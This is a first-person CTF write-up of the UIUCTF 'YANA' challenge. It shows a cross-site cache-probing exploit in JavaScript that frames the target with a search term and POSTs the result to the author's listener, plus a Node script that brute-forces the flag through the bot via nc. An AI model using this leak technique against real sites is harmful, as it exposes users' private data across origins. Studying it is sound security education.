# YANA (Yet Another Notepad App)

YANA is a notepad application that stores a user's note inside of their browser's localStorage. The flag is written to the notepad by a bot, and then that bot visits another website of your choosing. The application also contains the ability to search your note for a given substring.

## Writeup Note

This challenge was quite a couple of firsts for me -- this is even my first time doing a writeup! This was also the first time I've ever gotten first blood on a challenge, so I'm pretty happy about that.

I chose this challenge for a writeup because it was my favourite challenge of the whole event; I learned a bunch of new things from every attempt I made against this challenge, and also because the final exfiltration ended up being incredibly entertaining.

## Embed the Flag

We know that the flag is stored in the bot's localStorage for `https://chal.yana.wtf`. We need some sort of way of reading cross-origin localStorage, but we can't just access another site's localStorage -- browsers protect against things like that. Since we control where the bot goes after they put the note in their localStorage, I set up a quick webpage for the bot to go to afterwards. This means we have the ability to execute JS *and HTML* of our choosing.

The next step was embedding `https://chal.yana.wtf` in an `<iframe>`.

The plan here was simple. If the site was embedded, could we then read its localStorage from JS? The answer was no -- we don't have those kinds of permissions and the browser stops us; but while I was testing this out, I noticed something else: even though we don't have access to the other site's localStorage from the `<iframe>` using JS, **the iframe still renders with access to that localStorage**.

I was honestly expecting it to not have any knowledge of the localStorage at all, and for each `<iframe>` to get its own storage context. This is great news as it means that the embedded iframe has the knowledge of what the flag is!

## Search the Flag

It turns out that even though the localStorage is loaded, there isn't any way we can access it cross-origin. This turns us to the search functionality of the app, which I hadn't really understood the purpose of until now. Being able to search for a substring inside the note is going to have to be our method of exfiltration, but how?

A look at the site's code showed that a `search()` call is *always* triggered when the page loads, and **the search content is controlled by the URL**. This means that when `https://chal.yana.wtf#foo` is loaded, it automatically performs a search for foo.

This is great! Local testing confirmed I could search for things like `uiuctf{` in the URL, and then with a bit of brute force we could find out the flag.

We can perform a brute force search against the site, but that still leaves us with the problem of reading inside the `<iframe>` to see whether or not the search succeeded.

## Expose the Flag

We would have to evade the browser. I searched for ways to read inside an `<iframe>` using JS, but that's just impossible cross-origin.

What about triggering an error? If we could make the iframe conditionally error out, we could listen for a browser error and know whether that character was in the flag.

Nope. There's nothing there that could throw an error.

Let's look at the `search()` function in more detail.

```js
function search() {
	const note = window.localStorage.getItem("note") ?? "";
	console.log(`note: ${note}`);
	const query = document.location.hash.substring(1);
	console.log(`query: ${query}`);
	if (query) {
		if (note.includes(query)) {
		console.log('found');
		output.innerHTML =
			'found! <br/><img src="https://sigpwny.com/uiuctf/y.png"></img>';
		} else {
		console.log('not found');
		output.innerHTML =
			'nope.. <br/><img src="https://sigpwny.com/uiuctf/n.png"></img>';
		}
	}
}
```

There's a *lot* here that's quite interesting. The `console.log` statements drew my interest immediately -- those aren't *normally* left in production environments, so maybe they're here for a reason?

Even better - I opened my devtools in Firefox and saw this!

My testing flag showed up in the console, so now it should be a simple case of binding to the console and sending the output out... right?

```js
console.log = (value) => {
	fetch("?value=" + value);
}
```

Nope. `<iframe>`s all get their own execution context! This crossed off even more opportunities -- **there was no way our JS could affect their JS.**

The only thing remaining was the `output.innerHTML` call in `search()`. It loads an image, but we can't listen for outbound image requests.

We're missing something.

Completely stumped, I posted my progress in our team chat -- I've gotten some stuff done, and I have a neat outline of the whole attack, so if my teammates know some tricks, then this flag should be obtainable.

    [04:10] Seraphin: can you do a cache xs search
    <...>
    [04:12] Seraphin: this fits well since u can delete the cache of y.png and check after
    [04:12] zkldi: can i see if an image is cached?
    [04:12] Seraphin: https://xsleaks.com/docs/attacks/cache-probing/

That's our missing piece! We could use **cache probing** to determine whether `y.png` was loaded, and then fuzz the flag out!

[Here's the linked article, It's a great resource for cache probing](https://xsleaks.com/docs/attacks/cache-probing/).

## Probe the Flag

With the newfound knowledge that we can probe the cache for `y.png`, we can combine this into an attack!

The above article contained a useful example script for checking whether something was cached or not. From that, let's just write a script that uses their `ifCached` function.

```js
async function exploit() {
	// ?uiuctf{ ...
	let str = window.location.search.substring(1);

	document.getElementById("content").innerHTML = "";
	// boot an iframe
	document.getElementById("content").innerHTML = ("<iframe src=https://chal.yana.wtf#" + str + "></iframe>");

	// Wait a second to ensure the iframe loaded properly.
	await new Promise((resolve) => setTimeout(() => resolve(), 1000));

	const isCached = await ifCached("https://sigpwny.com/uiuctf/y.png");

	if (isCached) {
		// send our data out to a listening port.
		await fetch("/listener", {method: "POST", headers: {"Content-Type": "application/json" }, body: JSON.stringify({isCached, str})});
	}
}
```

However, I found out the hard way that cache probing attacks aren't 100% stable.

![](/uploads/2021-08-03/yana2.png)

The initial attack involved calling the bot once, and then calling `exploit()` again with some new parameters. That proved to be *way* too unstable, sadly, as the cache wouldn't reliably be voided.

To fix this, I moved the loop one layer up and wrote a quick node script to ~~harass~~ invoke the bot.

```js
const { exec } = require("child_process");

let baseStr = "uiuctf{";

const chars = "abcdefghijklmnopqrstuvwxyz_0123456789}";

for (const char of chars) {
	let str = baseStr + char;
	console.log(`Trying ${str}.`);

	exec(`echo 'http://zkldi.xyz/playground/yana?${str}' | nc yana-bot.chal.uiuc.tf 1337`);
}
```

Running this and manually altering it wasn't an elegant solution, but hey, it worked, and it was stable!

I'll just quickly exfiltrate the flag... right?

## Exfiltrate The flag

This flag took *one hour and thirty minutes* to exfiltrate. Keep in mind it was already 5AM here when I started!

The main reason was that my attack wasn't that accurate; it would rarely have false positives, but it would more commonly have false negatives. I had to run the script a lot of times even for the same characters!

Despite that, it was working; we were getting somewhere, and soon I'd have gotten my first ever first blood!

However, as the flag slowly revealed, it also revealed something else about the challenge. **We had gotten it wrong.**

Well, our solution doesn't involve GitHub pages at all, but it *was* working. We'll just quickly finish exfiltrating the flag...

Well, the flag turned out to be *very* long. Eventually, we got it: \
`uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0kup}`

In closing, this challenge was *very* fun! I had a great time connecting all the dots, and I learned something new about browsers with pretty much every attempt.

~~But please don't ever make brute force flags that long again...~~
